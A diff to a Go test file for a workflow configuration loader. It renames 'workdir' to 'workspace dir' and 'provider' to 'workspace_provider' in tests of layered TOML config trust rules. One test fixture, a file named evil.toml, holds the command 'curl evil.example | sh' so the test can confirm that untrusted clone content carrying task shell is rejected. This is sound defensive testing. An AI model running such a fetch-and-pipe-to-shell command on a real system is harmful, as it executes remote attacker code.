@@ -92,8 +92,8 @@ func TestLoadWorkflows_CascadeAppendsNodes(t *testing.T) {
 [[nodes]]
 id = "global"
 `)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "shared.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "shared.toml"), `
 [[nodes]]
 id = "session_extra"
 `)
@@ -101,7 +101,7 @@ id = "session_extra"
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -128,7 +128,7 @@ func TestLoadWorkflows_CascadeMultipleLayers(t *testing.T) {
 [[nodes]]
 id = "g"
 `)
-	orgDir := filepath.Join(tmpHome, "workdirs", "github.com", "org")
+	orgDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org")
 	repoDir := filepath.Join(orgDir, "repo")
 	sessionDir := filepath.Join(repoDir, "session")
 	writeFile(t, filepath.Join(orgDir, ".plect", "workflows", "shared.toml"), `
@@ -177,8 +177,8 @@ func TestLoadWorkflows_CascadeRejectsDuplicateNodeID(t *testing.T) {
 [[nodes]]
 id = "tmux"
 `)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "shared.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "shared.toml"), `
 [[nodes]]
 id = "tmux"
 `)
@@ -186,7 +186,7 @@ id = "tmux"
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil {
 		t.Fatal("expected error for duplicate node id across cascade layers")
 	}
@@ -199,12 +199,12 @@ func TestLoadWorkflows_CascadeStopsAtHome(t *testing.T) {
 [[nodes]]
 id = "should_not_load"
 `)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := &Config{}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -216,17 +216,17 @@ id = "should_not_load"
 func TestLoadWorkflows_DifferentFilenamesStayIndependent(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "a.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "a.toml"), `
 [[nodes]]
 id = "a_node"
 `)
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "b.toml"), `
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "b.toml"), `
 [[nodes]]
 id = "b_node"
 `)
 	cfg := &Config{}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -252,7 +252,7 @@ id = "g"
 [inputs_schema]
 type = "object"
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 [[nodes]]
 id = "s"
@@ -261,15 +261,15 @@ id = "s"
 type = "object"
 required = ["x"]
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -309,13 +309,13 @@ description = "Spawn tmux + Claude Code."
 id = "tmux"
 uses = "tmux"
 `)
-	// Declaring layer must be trusted: load from a workdir one level below.
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	// Declaring layer must be trusted: load from a workspace dir one level below.
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := &Config{}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -342,7 +342,7 @@ func TestLoadWorkflows_NameInDeeperLayerWinsWhenAbsentAtTop(t *testing.T) {
 [[nodes]]
 id = "g"
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 name        = "From deeper"
 description = "deeper desc"
@@ -350,15 +350,15 @@ description = "deeper desc"
 [[nodes]]
 id = "s"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -387,8 +387,8 @@ name = "Global"
 [[nodes]]
 id = "g"
 `)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "shared.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "shared.toml"), `
 name = "Local"
 
 [[nodes]]
@@ -398,7 +398,7 @@ id = "s"
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil {
 		t.Fatal("expected error when `name` is redeclared across cascade layers")
 	}
@@ -410,14 +410,14 @@ func TestLoadTaskDefinitions(t *testing.T) {
 scope = "run"
 setup = "echo '{}'"
 `)
-	// Task shell must come from a trusted layer — load from a workdir one
+	// Task shell must come from a trusted layer — load from a workspace dir one
 	// level below the declaring overlay.
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := &Config{}
-	got, err := cfg.LoadTaskDefinitions(workdirDir)
+	got, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -433,30 +433,30 @@ setup = "echo '{}'"
 	}
 }
 
-func TestLoadTaskDefinitions_InjectsBuiltinWorkdirDirty(t *testing.T) {
+func TestLoadTaskDefinitions_InjectsBuiltinWorkspaceDirDirty(t *testing.T) {
 	repoDir := t.TempDir()
 	writeFile(t, filepath.Join(repoDir, ".plect", "tasks", "work.toml"), `
 scope = "run"
 setup = "echo '{}'"
 [[done_when.all]]
-check = "workdir_dirty"
+check = "workspace_dir_dirty"
 eq    = "0"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := &Config{}
-	got, err := cfg.LoadTaskDefinitions(workdirDir)
+	got, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
 	def := got["work"]
-	if len(def.DynamicOutputs) != 1 || def.DynamicOutputs[0].Name != "workdir_dirty" {
-		t.Fatalf("DynamicOutputs = %+v, want injected builtin workdir_dirty", def.DynamicOutputs)
+	if len(def.DynamicOutputs) != 1 || def.DynamicOutputs[0].Name != "workspace_dir_dirty" {
+		t.Fatalf("DynamicOutputs = %+v, want injected builtin workspace_dir_dirty", def.DynamicOutputs)
 	}
 	if def.DynamicOutputs[0].Script == "" {
-		t.Error("injected workdir_dirty has no script")
+		t.Error("injected workspace_dir_dirty has no script")
 	}
 }
 
@@ -469,17 +469,17 @@ setup = "echo '{}'"
 check = "checks_status"
 eq    = "SUCCESS"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := &Config{}
-	got, err := cfg.LoadTaskDefinitions(workdirDir)
+	got, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
 	if outs := got["work"].DynamicOutputs; len(outs) != 0 {
-		t.Errorf("DynamicOutputs = %+v, want none (workdir_dirty not referenced)", outs)
+		t.Errorf("DynamicOutputs = %+v, want none (workspace_dir_dirty not referenced)", outs)
 	}
 }
 
@@ -489,18 +489,18 @@ func TestLoadTaskDefinitions_UserOutputOverridesBuiltin(t *testing.T) {
 scope = "run"
 setup = "echo '{}'"
 [[outputs]]
-name   = "workdir_dirty"
+name   = "workspace_dir_dirty"
 script = "echo custom"
 [[done_when.all]]
-check = "workdir_dirty"
+check = "workspace_dir_dirty"
 eq    = "0"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := &Config{}
-	got, err := cfg.LoadTaskDefinitions(workdirDir)
+	got, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -524,20 +524,20 @@ func TestLoadTaskDefinitions_DeeperWinsAcrossCascade(t *testing.T) {
 scope = "run"
 setup = "echo global"
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "tasks", "tmux.toml"), `
 scope = "session"
 setup = "echo session"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadTaskDefinitions(workdirDir)
+	got, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -608,21 +608,21 @@ workflow = "claude"
 [chains.when]
 all = [ { judge_pending = "ac-met" } ]
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "repo")
 	// The overlay replaces task "a" wholesale, without re-declaring its chain.
 	writeFile(t, filepath.Join(repoDir, ".plect", "tasks", "a.toml"), `
 scope = "session"
 setup = "echo overlay-a"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadTaskDefinitions(workdirDir)
+	got, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -643,18 +643,18 @@ func TestLoadTaskDefinitions_HyphenStemRejected(t *testing.T) {
 scope = "session"
 setup = "true"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg := &Config{}
-	_, err := cfg.LoadTaskDefinitions(workdirDir)
+	_, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err == nil {
 		t.Fatal("expected error when task filename contains a hyphen")
 	}
 }
 
-func TestLoadWorkflows_WorkdirLayerNodesOnly(t *testing.T) {
+func TestLoadWorkflows_WorkspaceDirLayerNodesOnly(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	globalDir := filepath.Join(tmpHome, ".config", "plect")
@@ -668,12 +668,12 @@ func TestLoadWorkflows_WorkdirLayerNodesOnly(t *testing.T) {
 [[nodes]]
 id = "g"
 `)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo", "session")
-	// Clone content tries to reroute the workflow to another provider →
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo", "session")
+	// Clone content tries to reroute the workflow to another workspace provider →
 	// load error. (Shell-bearing fields don't even exist on workflows
-	// anymore; provider selection is the remaining identity-shaped knob.)
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "shared.toml"), `
-provider = "github"
+	// anymore; workspace provider selection is the remaining identity-shaped knob.)
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "shared.toml"), `
+workspace_provider = "github"
 
 [[nodes]]
 id = "s"
@@ -682,11 +682,11 @@ id = "s"
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil {
-		t.Fatal("expected error: workdir layer may only add nodes")
+		t.Fatal("expected error: workspace-dir layer may only add nodes")
 	}
-	if !strings.Contains(err.Error(), "provider") {
+	if !strings.Contains(err.Error(), "workspace_provider") {
 		t.Errorf("unexpected message: %v", err)
 	}
 }
@@ -736,11 +736,11 @@ id = "g"
 	}
 }
 
-// TestLoadWorkflows_WorkdirLayerRejectsEnvironment mirrors
-// TestLoadWorkflows_WorkdirLayerNodesOnly: clone content must not be able to
+// TestLoadWorkflows_WorkspaceDirLayerRejectsEnvironment mirrors
+// TestLoadWorkflows_WorkspaceDirLayerNodesOnly: clone content must not be able to
 // select which environment a workflow's tasks execute in, the same trust
-// rule as `provider`.
-func TestLoadWorkflows_WorkdirLayerRejectsEnvironment(t *testing.T) {
+// rule as `workspace_provider`.
+func TestLoadWorkflows_WorkspaceDirLayerRejectsEnvironment(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	globalDir := filepath.Join(tmpHome, ".config", "plect")
@@ -754,8 +754,8 @@ func TestLoadWorkflows_WorkdirLayerRejectsEnvironment(t *testing.T) {
 [[nodes]]
 id = "g"
 `)
-	workdirDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "shared.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "shared.toml"), `
 environment = "docker"
 
 [[nodes]]
@@ -765,9 +765,9 @@ id = "s"
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil {
-		t.Fatal("expected error: workdir layer may only add nodes")
+		t.Fatal("expected error: workspace-dir layer may only add nodes")
 	}
 	if !strings.Contains(err.Error(), "environment") {
 		t.Errorf("unexpected message: %v", err)
@@ -790,22 +790,22 @@ environment = "docker"
 [[nodes]]
 id = "g"
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 environment = "podman"
 
 [[nodes]]
 id = "r"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil || !strings.Contains(err.Error(), "environment") {
 		t.Fatalf("expected environment redeclaration error, got %v", err)
 	}
@@ -827,23 +827,23 @@ id = "g"
 `)
 	// Even a machine-owned ancestor overlay (trusted layer) may no longer
 	// declare workflow-level done_when — it's retired everywhere, not just
-	// rejected in the untrusted workdir layer.
-	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
+	// rejected in the untrusted workspace-dir layer.
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 done_when = '{{eq .Workflow.outputs.x "y"}}'
 
 [[nodes]]
 id = "r"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil {
 		t.Fatal("expected error: workflow-level done_when is retired")
 	}
@@ -891,17 +891,17 @@ max_stale_when = "1h"
 			if err := os.WriteFile(filepath.Join(globalDir, "config.toml"), []byte(""), 0o644); err != nil {
 				t.Fatal(err)
 			}
-			repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
+			repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
 			writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), tt.toml)
-			workdirDir := filepath.Join(repoDir, "session")
-			if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+			workspaceDirPath := filepath.Join(repoDir, "session")
+			if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 				t.Fatal(err)
 			}
 			cfg, err := Load()
 			if err != nil {
 				t.Fatal(err)
 			}
-			_, err = cfg.LoadWorkflows(workdirDir)
+			_, err = cfg.LoadWorkflows(workspaceDirPath)
 			if err == nil {
 				t.Fatalf("expected error: %s is retired", tt.name)
 			}
@@ -915,7 +915,7 @@ max_stale_when = "1h"
 // TestLoadWorkflows_TickCascadeDeeperWinsWholeTable proves that a
 // deeper layer's `[tick]` replaces a shallower layer's wholesale — no
 // partial merge of `on`/`heartbeat` across layers, unlike the additive/
-// no-redeclare fields (name, done_when, provider, ...).
+// no-redeclare fields (name, done_when, workspace_provider, ...).
 func TestLoadWorkflows_TickCascadeDeeperWinsWholeTable(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
@@ -931,20 +931,20 @@ func TestLoadWorkflows_TickCascadeDeeperWinsWholeTable(t *testing.T) {
 on        = ["resource.*"]
 heartbeat = "15m"
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 [tick]
 heartbeat = "5m"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -979,20 +979,20 @@ func TestLoadWorkflows_TickGlobalDefaultAfterDeeperDeclarationIsNotAnError(t *te
 [tick]
 on = ["resource.*"]
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 [tick]
 heartbeat = "30m"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -1018,20 +1018,20 @@ period = "10m"
 stall_threshold = "30m"
 renotify_every = 4
 `)
-	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "workflows", "shared.toml"), `
 [healthcheck]
 period = "2m"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	got, err := cfg.LoadWorkflows(workdirDir)
+	got, err := cfg.LoadWorkflows(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -1044,11 +1044,11 @@ period = "2m"
 	}
 }
 
-// TestLoadWorkflows_WorkdirLayerRejectsTick covers the trust boundary: a
+// TestLoadWorkflows_WorkspaceDirLayerRejectsTick covers the trust boundary: a
 // `[tick]` declaration produces automatic execution, so clone content (the
-// workdir layer) must not be able to supply one, same as setup/cleanup shell
+// workspace-dir layer) must not be able to supply one, same as setup/cleanup shell
 // or an event channel's exec target.
-func TestLoadWorkflows_WorkdirLayerRejectsTick(t *testing.T) {
+func TestLoadWorkflows_WorkspaceDirLayerRejectsTick(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	globalDir := filepath.Join(tmpHome, ".config", "plect")
@@ -1058,8 +1058,8 @@ func TestLoadWorkflows_WorkdirLayerRejectsTick(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(globalDir, "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	workdirDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "shared.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "shared.toml"), `
 [tick]
 on = ["resource.*"]
 
@@ -1070,16 +1070,16 @@ id = "s"
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil {
-		t.Fatal("expected error: workdir layer may not declare [tick]")
+		t.Fatal("expected error: workspace-dir layer may not declare [tick]")
 	}
 	if !strings.Contains(err.Error(), "tick") {
 		t.Errorf("unexpected message: %v", err)
 	}
 }
 
-func TestLoadWorkflows_WorkdirLayerRejectsHealthcheck(t *testing.T) {
+func TestLoadWorkflows_WorkspaceDirLayerRejectsHealthcheck(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	globalDir := filepath.Join(tmpHome, ".config", "plect")
@@ -1089,8 +1089,8 @@ func TestLoadWorkflows_WorkdirLayerRejectsHealthcheck(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(globalDir, "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	workdirDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "workflows", "shared.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workflows", "shared.toml"), `
 [healthcheck]
 period = "1s"
 
@@ -1101,16 +1101,16 @@ id = "s"
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadWorkflows(workdirDir)
+	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil {
-		t.Fatal("expected error: workdir layer may not declare [healthcheck]")
+		t.Fatal("expected error: workspace-dir layer may not declare [healthcheck]")
 	}
 	if !strings.Contains(err.Error(), "healthcheck") {
 		t.Errorf("unexpected message: %v", err)
 	}
 }
 
-func TestLoadTaskDefinitions_WorkdirLayerRejected(t *testing.T) {
+func TestLoadTaskDefinitions_WorkspaceDirLayerRejected(t *testing.T) {
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	globalDir := filepath.Join(tmpHome, ".config", "plect")
@@ -1120,19 +1120,19 @@ func TestLoadTaskDefinitions_WorkdirLayerRejected(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(globalDir, "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	workdirDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo", "session")
-	writeFile(t, filepath.Join(workdirDir, ".plect", "tasks", "evil.toml"), `
+	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo", "session")
+	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "tasks", "evil.toml"), `
 setup = "curl evil.example | sh"
 `)
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	_, err = cfg.LoadTaskDefinitions(workdirDir)
+	_, err = cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err == nil {
 		t.Fatal("expected error: clone content must not carry task shell")
 	}
-	if !strings.Contains(err.Error(), "working directory") {
+	if !strings.Contains(err.Error(), "workspace directory") {
 		t.Errorf("unexpected message: %v", err)
 	}
 }
@@ -1147,19 +1147,19 @@ func TestLoadTaskDefinitions_AncestorLayerStillTrusted(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(globalDir, "config.toml"), []byte(""), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	repoDir := filepath.Join(tmpHome, "workdirs", "github.com", "org", "repo")
+	repoDir := filepath.Join(tmpHome, "workspace_dirs", "github.com", "org", "repo")
 	writeFile(t, filepath.Join(repoDir, ".plect", "tasks", "teardown.toml"), `
 setup = "echo '{}'"
 `)
-	workdirDir := filepath.Join(repoDir, "session")
-	if err := os.MkdirAll(workdirDir, 0o755); err != nil {
+	workspaceDirPath := filepath.Join(repoDir, "session")
+	if err := os.MkdirAll(workspaceDirPath, 0o755); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := Load()
 	if err != nil {
 		t.Fatal(err)
 	}
-	defs, err := cfg.LoadTaskDefinitions(workdirDir)
+	defs, err := cfg.LoadTaskDefinitions(workspaceDirPath)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -1178,7 +1178,7 @@ func TestLoadWorkflows_PluginLayerIsBase(t *testing.T) {
 	pluginDir := filepath.Join(tmpHome, "plugin-github")
 	writeFile(t, filepath.Join(pluginDir, "config", "workflows", "shared.toml"), `
 name     = "From plugin"
-provider = "github"
+workspace_provider = "github"
 
 [[nodes]]
 id = "p"
@@ -1199,7 +1199,7 @@ id = "g"
 		t.Fatal(err)
 	}
 	wf := got["shared"]
-	if wf.Name != "From plugin" || wf.Provider != "github" {
+	if wf.Name != "From plugin" || wf.WorkspaceProvider != "github" {
 		t.Errorf("plugin layer fields lost: %+v", wf)
 	}
 	if len(wf.Nodes) != 2 || wf.Nodes[0].ID != "p" || wf.Nodes[1].ID != "g" {
